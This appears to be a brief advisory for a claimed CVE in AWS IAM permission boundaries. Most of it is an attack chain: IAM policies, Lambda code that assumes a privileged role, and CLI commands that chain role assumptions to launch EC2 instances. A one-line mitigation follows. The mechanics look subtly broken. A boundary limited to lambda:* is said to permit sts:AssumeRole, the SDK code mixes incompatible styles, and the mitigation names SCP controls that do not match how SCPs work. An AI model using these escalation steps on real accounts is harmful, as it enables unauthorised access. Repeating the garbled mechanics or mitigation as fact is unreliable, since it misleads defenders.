CVE-2025-21455 arises when a user-assigned permission boundary does not cover ec2:RunInstances in the contained policy.  Attack chain:

1. Initial role: arn:aws:iam::123456789012:role/LambdaExecBoundary
   Boundary policy (trusted):
   {
     "Version": "2012-10-17",
     "Statement": [{
         "Effect": "Allow",
         "Action": ["lambda:*"],
         "Resource": "*",
         "Condition": {"StringEquals": {"aws:RequestedRegion": "us-east-1"}}
     }]
   }

2. Contained role: arn:aws:iam::123456789012:role/EC2Admin
   Inline policy:
   {
     "Version": "2012-10-17",
     "Statement": [{
         "Effect": "Allow",
         "Action": ["ec2:RunInstances", "ec2:Describe*"],
         "Resource": "*"
     }]
   }

3. Lambda code:
   AWS.STS.assumeRole({
     RoleArn: "arn:aws:iam::123456789012:role/EC2Admin",
     RoleSessionName: "escalate"
   }).promise().then(token => {
     new AWS.EC2({ credentials: token.Credentials }).runInstances(...).send();
   });

Commands:
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/LambdaExecBoundary --role-session-name bob
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/EC2Admin --role-session-name escalate
export AWS_ACCESS_KEY_ID=ASIAXXX...
aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type m5.large

Mitigation: DenyPermissionBoundaryOverride in SCPs; require boundary to include all actions needed by contained roles; block sts:AssumeRole if SessionPolicy is not subset of permission boundary.

